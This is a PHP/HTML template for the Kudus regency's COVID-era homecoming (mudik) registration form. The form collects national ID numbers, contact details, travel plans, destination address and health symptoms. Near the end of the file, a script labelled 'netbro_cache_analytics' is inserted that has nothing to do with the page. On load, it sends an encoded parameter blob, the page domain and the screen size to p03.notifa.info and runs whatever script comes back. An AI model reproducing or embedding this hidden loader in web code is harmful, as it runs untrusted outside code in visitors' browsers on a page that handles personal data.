<!DOCTYPE html>
<html lang="id">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#00B754">
	<meta name="msapplication-navbutton-color" content="#00B754">
	<meta name="csrf-token" content="K5LcdgYsGq30M756cGQ8oXwQWrs0Oi544mdmH3hw">


	<title>Kabupaten Kudus</title>
	<meta property="og:title" content="Kabupaten Kudus" />

	<link rel="shortcut icon" href="<?php echo base_url(); ?>landy/vendor/assets/img/logo/icon.png">
	<link rel="stylesheet" type="text/css" href="<?php echo base_url(); ?>assets/css/mudik.css">
	<link rel="stylesheet" type="text/css" href="<?php echo base_url(); ?>assets/select2/css/select2.css">
	<link rel="stylesheet" href="https://lipis.github.io/bootstrap-sweetalert/dist/sweetalert.css" />
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />

	<script>
		var PATH = 'http://mudik.kuduskab.go.id';
	</script>
	<style>
		.sbtn {
			box-sizing: border-box;
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none;
			background-color: transparent;
			/* border: 2px solid #dd2003; */
			/* border-radius: 0.7em; */
			color: #e74c3c;
			cursor: pointer;
			display: flex;
			/* align-self: center;
			font-size: 1rem;
			font-weight: 400;
			line-height: 1;
			margin: 2px;
			padding: 1.1em 3.5em; */
			/* text-decoration: none; */
			text-align: left;
			text-transform: uppercase;
			font-family: 'Montserrat', sans-serif;
			font-weight: 700;
			/* width: 1000%; */

		}

		.sbtn:hover,
		.sbtn:focus {
			color: #000;
			/* background-color: #dd2003; */
			outline: 0;
		}
	</style>
</head>

<body style="font-size:13pt !important;">

	<header id="header" class="header mb-4 d-print-none">
		<div class="container">
			<nav class="navbar navbar-expand-sm navbar-light">
				<a class="header__logo" href="http://mudik.kuduskab.go.id">
					<img src="<?php echo base_url(); ?>gambar/logo.png" alt="logo Kudus Kab">
				</a>
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<div class="collapse navbar-collapse justify-content-end" id="navbarNavDropdown">
					<ul class="navbar-nav">
						<li class="nav-item ">
							<a class="nav-link" href="<?= base_url(''); ?>">Beranda</a>
						</li>
						<!-- <li class="nav-item "><a class="nav-link" href="<?= base_url('C_mudik/form'); ?>">Form Pemudik</a>
						</li> -->
						<li class="nav-item "><a class="nav-link" href="<?= base_url('C_mudik/list'); ?>">Terdaftar</a>
						</li>
					</ul>
				</div>
			</nav>
		</div>
	</header>
	<div class="header-padding"></div>

	<!-- <section class="section pt-0 position-relative">
		<div class="container-fluid" style="color:black">
			<div class="row justify-content-center">
				<div class="col-12 col-md-8">
					<div class="rounded-15 shadow bg-white">
						<div class="carda" style="padding: 15px;">
							<div class="row justify-content-center">
							<div class="card-body">

									<form action="<?php echo base_url('C_public/get'); ?>" class="form-inline" method="POST">
										<div class="form-inline">
											<input type="search" name="nik" class="form-control btn" placeholder="silakan masukan NIK " style="height: 50px; width: 400px" autocomplete="off">
										</div>
										
										<div class="form-inline" style="margin-left:5px">
											<button class="form-control btn" style="height: 50px; width:50px; text-align:center">
												<i class="fa fa-search-plus" ></i></button>
										</div>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section> -->
	<br>


	<section class="section pt-0 position-relative">
		<div class="container-fluid" style="color:black">
			<div class="row justify-content-center">
				<div class="col-12 col-md-8">
					<div class="rounded-15 shadow bg-white">
						<div class="carda" style="padding: 15px;">
							<div class="card-body">

								<form action="<?= base_url('C_mudik/create/'); ?>" method="post" id="myForm" onSubmit="return validasi(this)">
									<div class="form-row">
										<div class="form-group col-12">
											<div style="margin-bottom:15px;  text-align:center; letter-spacing: 2px;">
												<img src="<?php echo base_url(); ?>gambar/logo.png" alt="logo Kudus Kab" width="70px" style="margin-bottom:5px">
												<!-- <img src="<?php echo base_url(); ?>gambar/polda_jateng.png" alt="logo Kudus Kab" width="70px" style="margin-bottom:5px"> -->
												<h4 class="font-hotline font-weight-bold p-0 mb-3">DATA PEMUDIK KABUPATEN KUDUS</h4>
											</div>
											<div style="background-color:#dd2003; color:white; text-transform: uppercase; letter-spacing: 3px; text-align:center" class="alert alert-success mb-2" role="alert">
												Silahkan Isi Formulir Dibawah ini dengan benar
											</div>
										</div>

										<div class="form-group col-12">
											<label for="fm-nik">NIK</label>
											<input type="number" class="form-control" name="nik" placeholder="No Induk Kependudukan/ No KTP" onkeypress="return hanyaAngka(event)" id="nik" maxlength="16" autocomplete="off" required>
											<div class="form_error"><?php echo validation_errors(); ?> </div>
										</div>

										<div class="form-group col-12">
											<label for="fm-nama">Nama</label>
											<input type="text" class="form-control" id="fm-nama" placeholder="Nama Lengkap" name="nama" autocomplete="off" required>
										</div>

										<div class="form-group col-6">
											<label for="fm-tgl-lahir">Tanggal Lahir</label>
											<input type="date" class="form-control js-tanggal-lahir" autocomplete="off" id="fm-tgl-lahir" placeholder="dd/mm/yyyy" name="tanggal_lahir" required value="">
										</div>

										<div class="form-group col-6">
											<label for="fm-tgl-lahir">Umur</label>
											<input type="text" class="form-control js-tanggal-lahir" autocomplete="off" id="umur" placeholder="Umur Anda" name="umur" required readonly>
										</div>

										<div class="form-group col-12">
											<label for="fm-nama">Jenis Kelamin</label>

											<div class="custom-control custom-radio">
												<input type="radio" id="jenis-kelamin-l" name="jenis_kelamin" class="custom-control-input" value="L" required>
												<label class="custom-control-label" for="jenis-kelamin-l">Laki - Laki</label>
											</div>

											<div class="custom-control custom-radio">
												<input type="radio" id="jenis-kelamin-p" name="jenis_kelamin" class="custom-control-input" value="P" required>
												<label class="custom-control-label" for="jenis-kelamin-p">Perempuan</label>
											</div>


										</div>

										<div class="form-group col-12">
											<label for="fm-no-telp">No Hp</label>
											<input type="number" class="form-control no-spinner" id="fm-no-telp" placeholder="08xxxxx" name="hp" required value="" maxlength="12">
										</div>


										<div class="form-group col-12 mt-1" id="negara">
											<hr>
											<label for="fm-nama-negara">Negara Asal <strong>Mudik</strong></label>
											<select class='form-control select2' data-width="100%" name="negara" required>
												<option value=''>Pilih Negara</option>
												<?php
												foreach ($negara as $n) {
													echo "<option value='$n[country_name]'>$n[country_name]</option>";
												}
												?>
											</select>
											<p class="small text-muted">
												Silahkan pilih Negara tempat anda <strong>merantau</strong> atau tempat sebelum anda mudik/ pulang ke Kudus
											</p>
										</div>

										<div class="form-group col-12" id="kab" hidden>
											<label for="fm-kota-asal">Kota/ Kabupaten Asal <strong>Mudik</strong></label>
											<select class="form-control select2" name="asalkota" id="kabupaten" class="form-control" data-width="100%" required>
												<option value='pilih'>Pilih Kabupaten/Kota</option>
												<?php
												foreach ($kab as $n) {
													echo "<option value='$n[id]'>$n[name]</option>";
												}
												?>
											</select>
											<span class="small text-muted">
												Silahkan Pilih Kota tempat anda <strong class="text text-danger">merantau</strong> atau tempat sebelum anda mudik/ pulang ke Kudus.
											</span>
										</div>

										<div class="form-group col-12">
											<label for="fm-nama">Keperluan/ tujuan</label>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-keperluan-mudik" name="keperluan" class="custom-control-input" value="Mudik" required>
												<label class="custom-control-label" for="fm-keperluan-mudik">Mudik</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-keperluan-liburan" name="keperluan" class="custom-control-input" value="Liburan" required>
												<label class="custom-control-label" for="fm-keperluan-liburan">Liburan</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-keperluan-bisnis" name="keperluan" class="custom-control-input" value="Bisnis" required>
												<label class="custom-control-label" for="fm-keperluan-bisnis">Bisnis</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-keperluan-lainnya" name="keperluan" class="custom-control-input show" value="Lainnya" required>
												<label class="custom-control-label" for="fm-keperluan-lainnya">Lainnya</label>
											</div>
											<div id="tampil" style="display:none" class="form-group col-12">
												<label>Tujuan Lainya</label>
												<textarea name="perlu_lainya" class="form-control" rows="2"></textarea>
											</div>
										</div>


										<div class="form-group col-12">
											<label for="fm-kota-asal">Alat Transportasi yang Anda gunakan saat menuju Kabupaten Kudus</label>
											<div class="custom-control custom-radio">
												<input type="radio" class="custom-control-input" id="fm-transport-bus" name="transportasi" value="Bus" required>
												<label class="custom-control-label" for="fm-transport-bus">Bus</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" class="custom-control-input" id="fm-transport-pesawat" name="transportasi" value="Pesawat Terbang" required>
												<label class="custom-control-label" for="fm-transport-pesawat">Pesawat Terbang</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" class="custom-control-input" id="fm-transport-kereta" name="transportasi" value="Kereta Api" required>
												<label class="custom-control-label" for="fm-transport-kereta">Kereta Api</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" class="custom-control-input" id="fm-transport-roda4" name="transportasi" value="Kendaraan Roda 4" required>
												<label class="custom-control-label" for="fm-transport-roda4">Mobil</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" class="custom-control-input" id="fm-transport-roda2" name="transportasi" value="Kendaraan Roda 2" required>
												<label class="custom-control-label" for="fm-transport-roda2">Motor</label>
											</div>
										</div>

										<div class="form-group col-12 col-sm-6">
											<label for="fm-estimasi-sampai">Waktu Kedatangan</label>
											<input type="date" class="form-control js-datepickerw" autocomplete="off" id="fm-estimasi-sampai" placeholder="dd/mm/yyyy" data-toggle="datetimepickerw" data-target="#fm-estimasi-sampaie" name="estimasisampai" value="" required>
										</div>

										<div class="form-group col-12 col-sm-6">
											<label for="fm-lama-mudik">Berapa Lama Di Kudus</label>
											<div class="input-group">
												<input type="number" class="form-control" id="fm-lama-mudik" placeholder="" name="lamamudik" required value="">
												<div class="input-group-append">
													<span class="input-group-text">Hari</span>
												</div>
											</div>
										</div>

										<div class="form-group mt-4 col-12">
											<h4 class="subtitle">Data Tujuan</h4>
										</div>

										<div class="form-group col-12">
											<label for="fm-nama">Hubungan dengan tujuan</label>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-hubungan-orang-tua" name="hubungan_tujuan" class="custom-control-input" value="Orang Tua" required>
												<label class="custom-control-label" for="fm-hubungan-orang-tua">Orang Tua</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-hubungan-saudara" name="hubungan_tujuan" class="custom-control-input" value="Saudara" required>
												<label class="custom-control-label" for="fm-hubungan-saudara">Saudara</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-hubungan-teman" name="hubungan_tujuan" class="custom-control-input" value="Teman" required>
												<label class="custom-control-label" for="fm-hubungan-teman">Teman</label>
											</div>
											<div class="custom-control custom-radio">
												<input type="radio" id="fm-hubungan-lainnya" name="hubungan_tujuan" class="custom-control-input show" value="Hubungan" required>
												<label class="custom-control-label" for="fm-hubungan-lainnya">Lainnya</label>
											</div>
											<div id="modal" style="display:none" class="form-group col-12">
												<label for="fm-nama">Tujuan Lainya</label>
												<textarea name="hub_tujuanlain" class="form-control" rows="2"></textarea>
											</div>
										</div>

										<div class='form-group col-12'>
											<label>Pilih Kecamatan</label>
											<select type="text" class='form-control select2' id='kecamatan' name="kectujuan" required>
												<option value=''>Pilih Kecamatan</option>
												<?php
												foreach ($provinsi as $prov) {
													echo "<option value='$prov[id]'>$prov[name]</option>";
												} ?>
											</select>
										</div>

										<div class='form-group col-12'>
											<label>Kelurahan/Desa</label>
											<select class='form-control select2' id='kelurahan-desa' name="desa_tujuan" required="required">
												<option value='0'>Pilih Kecamatan Dahulu</option>
											</select>
										</div>

										<div class="form-group col-6">
											<label for="fm-no-rt-tujuan">No RT</label>
											<input type="number" class="form-control" id="fm-no-rt-tujuan" name="tujuan_no_rt" value="" required>
										</div>

										<div class="form-group col-6">
											<label for="fm-no-rw-tujuan">No RW</label>
											<input type="number" class="form-control" id="fm-no-rw-tujuan" name="tujuan_no_rw" value="" required>
										</div>

										<div class="form-group mt-4 col-12">
											<hr>
											<h4 class="subtitle">Data Kesehatan</h4>
										</div>

										<div class="form-group col-12">
											<label>Kondisi Saat ini</label>

											<div class="custom-control custom-radio">
												<input type="radio" id="kesehatan-demam-0" name="kondisikesehatan" class="custom-control-input" value="sehat" checked>
												<label class="custom-control-label" for="kesehatan-demam-0">Sehat</label>
											</div>

											<div class="custom-control custom-radio">
												<input type="radio" id="kesehatan-demam-1" name="kondisikesehatan" class="custom-control-input" value="sakit">
												<label class="custom-control-label" for="kesehatan-demam-1"> Sakit dengan kondisi (Bisa memilih lebih dari satu ):</label>
											</div>
											<!-- <textarea rows="3" style="width:400px;" name="kondisi_lain"></textarea> -->

											<div class="form-check">
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="kondisilain[]" id="fm-kesanggupan-2" value="Panas">
													<label class="custom-control-label" for="fm-kesanggupan-2">Panas (lebih dari 37)</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="kondisilain[]" id="fm-kesanggupan-3" value="Flu">
													<label class="custom-control-label" for="fm-kesanggupan-3">Flu</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="kondisilain[]" id="fm-kesanggupan-4" value="Batuk">
													<label class="custom-control-label" for="fm-kesanggupan-4">Batuk</label>
												</div>
												<div class="custom-control custom-checkbox">
													<input type="checkbox" class="custom-control-input" name="kondisilain[]" id="fm-kesanggupan-5" value="Diare">
													<label class="custom-control-label" for="fm-kesanggupan-5">Diare</label>
												</div>

												<div class="checkbox">
													<label class="form-check-label">Keluhan Lain :</label>
													<textarea rows="3" class="form-control" name="keluhanlain"></textarea>
												</div>
											</div>
										</div><hr>


										<div class="form-group mt-12 col-12 rounded-15">
											<center>
												<div class="rounded-15 shadow bg-red" style="border: 2px solid red; width:200px; margin-top:15px; letter-spacing: 2px;">
													<h5 style="text-align: center; margin:9px 9px 9px 9px;">PERNYATAAN</h5>
												</div>
											</center>

											<label style="text-align:justify; margin:30px 13px 13px 13px; letter-spacing: 1px;">Sehubungan dengan adanya pandemi virus Corona (Covid-19) bilamana saya terindikasi tertular maka saya sanggup untuk mengisolasi diri dan menyampaikan kepada pihak yang berwenang (RT/RW/Puskesmas) ditempat tujuan yang akan saya kunjungi dan bersedia dikarantina atas rekomendasi dari tim kesehatan daerah<br><br>
												Demikian surat pernyataan ini saya buat dengan sebenarnya untuk dapat dipergunakan sebagaimana mestinya</label>

											<label style="text-align: justify;">
												<p style="color:red; font-weight:bold; font-size:10pt; margin:20px 13px 13px 13px; text-transform: uppercase; letter-spacing: 1px;">Cek kelengkapan data anda sebelum menyimpan dan pastikan anda membaca pernyataan di atas, jika sudah selesai silahkan Klik <i style="color:green">Setuju dan Simpan</i></p>
											</label>

											<div class="form-group mt-4 col-12">
												<input type="hidden" name="_token" value="K5LcdgYsGq30M756cGQ8oXwQWrs0Oi544mdmH3hw">
												<button type="submit" name="submit" class="btn btn-danger  rounded-15 shadow bg-red" style="letter-spacing: 1px;">SETUJU DAN SIMPAN</button>
											</div>
										</div>


									</div>
								</form>

							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>

	<footer class="web-footer mt-3 py-4 text-center d-print-none">
		<div class="container">
			<div class="copyright">
				&copy; Copyright <strong><span>Kabupaten Kudus</span></strong>. All Rights Reserved
			</div>
			<div class="credits">
				Crafted by <a href="http://diskominfo.kuduskab.go.id">Kominfo</a>
			</div>
		</div>
	</footer>



	<script src="<?php echo base_url(); ?>assets/js/manifest.js"></script>
	<script src="<?php echo base_url(); ?>assets/js/vendor.js"></script>
	<script src="<?php echo base_url(); ?>assets/js/app.js"></script>


	<script src="<?php echo base_url(); ?>assets/dist/js/jquery.js"></script>

	<script src="<?php echo base_url() ?>assets/select2/js/select2.js"></script>
	<!-- <script src="https://lipis.github.io/bootstrap-sweetalert/dist/sweetalert.js"></script> -->


</body>

</html>

<script type="text/javascript">
	function validasi(form) {
		if (form.kectujuan.value == "pilih") {
			alert("Anda belum memilih Kecamatan!");
			return (false);
		}
		return (true);
	}
</script>
<script>
	window.onload = function() {
		$('#fm-tgl-lahir').on('change', function() {
			var dob = new Date(this.value);
			var today = new Date();
			var age = Math.floor((today - dob) / (365.25 * 24 * 60 * 60 * 1000));
			$('#umur').val(age);
		});
	}
</script>
<script type="text/javascript">
	$(function() {

		$.ajaxSetup({
			type: "POST",
			url: "<?php echo base_url('C_mudik/ambil_data') ?>",
			cache: false,
		});

		$("#provinsi").change(function() {

			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kabupaten',
						id: value
					},
					success: function(respond) {
						$("#kabupaten-kota").html(respond);
					}
				})
			}

		});


		$("#kabupaten-kota").change(function() {
			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kecamatan',
						id: value,
						required: 'required'
					},
					success: function(respond) {
						$("#kecamatan").html(respond);
					}
				})
			}
		})

		$("#kecamatan").change(function() {
			var value = $(this).val();
			if (value > 0) {
				$.ajax({
					data: {
						modul: 'kelurahan',
						id: value
					},
					success: function(respond) {
						$("#kelurahan-desa").html(respond);
					}
				})
			}
		})

		// $("#negara").change(function() {

		// 	var value = $(this).val();
		// 	if (value > 0) {
		// 		$.ajax({
		// 			data: {
		// 				modul: 'districts',
		// 				id: value
		// 			},
		// 			success: function(respond) {
		// 				$("#districts").html(respond);
		// 			}
		// 		})
		// 	}

		// });

	})
</script>


<!-- <script type="text/javascript">
	function validasi() {
		var nip = document.forms["myForm"]["nik"].value;
		// var kab = document.forms["myForm"]["kabupaten"].value;
		var desa = document.forms["myForm"]["kelurahan-desa"].value;

		if (nip.length != 16) {
			alert("Format NIK Salah");
			document.getElementById("nik").value = "";
			document.getElementById('nik').focus();
			return false;
		} else if (desa.length == "0") {
			alert("Desa Belum Dipilih");
			document.getElementById("kelurahan-desa").value = "";
			document.getElementById('kelurahan-desa').focus();
			return false;
		}
	}
</script> -->
<script type="text/javascript">
	if (self == top) {
		function netbro_cache_analytics(fn, callback) {
			setTimeout(function() {
				fn();
				callback();
			}, 0);
		}

		function sync(fn) {
			fn();
		}

		function requestCfs() {
			var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
			var idc_glo_r = Math.floor(Math.random() * 99999999999);
			var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX%2bxo46Nixl1MzZ9veboxdCXA0di851vq9G8WfQ6Oe9sxnSYzkb%2fYj7mb4xjr6%2bbY3uaoqyvbnW5roch3kGUIegq1UvjPi9kqgYHwlvXb8oY1vGI7omlPeMipUEzcFkm1KpuxIgO6oJu2xL9Zoflf0U0HymMxzEW95yredRz0l4lVDt%2f0%2f4PjDJSX3HoDdSgNOVKndua9fc75BUXmwlzmRrRrqaWITMVmey6jq4QFd3ck9tWFJ1MRLMj1LorsPFAmUeOv0yL2xVRxv%2bXmRBzBSgMeEb2U9dRmpYnjNRwg6rSf5dMWe4xi4mdUvUhmIvVD1NnF3CLQHij8kyF84emWDJNFwZxeofUAxHJ6%2fgrNxGhSjC0bCsh%2fc4T2mqjUv6OiFN%2fi2LTO5sWo%2b04TuBif9UxqvY%2fspIMzcccxFr8TY8xmSze6mklCN3oZXhGNtnMJPeNZYp9BYQSUr%2f8fXJS2GoCmNbdh7gmug89u%2b7EtHIpYb9hxDbJslt1Izj5T5j8vqxq38cEXv6l7Fcdc3nOl%2bKPtyF8tZ4YECiMsP3HNrAh0yb3j%2fzZoArg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
			var bsa = document.createElement('script');
			bsa.type = 'text/javascript';
			bsa.async = true;
			bsa.src = url;
			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
		}
		netbro_cache_analytics(requestCfs, function() {});
	};
</script>

<script>
	$(document).ready(function() {
		$('.select2').select2({
			// minimumInputLength: 3
		});

	});
</script>
<script>
	function hanyaAngka(evt) {
		var charCode = (evt.which) ? evt.which : event.keyCode
		if (charCode > 31 && (charCode < 48 || charCode > 57))

			return false;
		return true;
	}
</script>
<script type='text/javascript'>
	$(window).load(function() {
		$("#negara").change(function() {
			console.log($("#negara option:selected").val());
			if ($("#negara option:selected").val() != "Indonesia") {
				$('#kab').prop('hidden', 'true');
			} else {
				$('#kab').prop('hidden', false);
			}
		});
	});
</script>

<script type="text/javascript">
	$(window).load(function() {
		$(":radio").click(function() {
			$("#tampil").hide()
			if ($(this).val() == "Lainnya") {
				$("#tampil").show();
			}
		});
		$(":radio").click(function() {
			if (($(this).val() == "Mudik") || ($(this).val() == "Liburan") || ($(this).val() == "Bisnis")) {
				$("#tampil").hide();
			}
		});
	})

	$(window).load(function() {
		$(":radio").click(function() {
			$("#modal").hide()
			if ($(this).val() == "Hubungan") {
				$("#modal").show();
			}
		});
		$(":radio").click(function() {
			if (($(this).val() == "OrangTua") || ($(this).val() == "Saudara") || ($(this).val() == "Teman")) {
				$("#modal").hide();
			}
		});
	})
</script>

</body>

</html>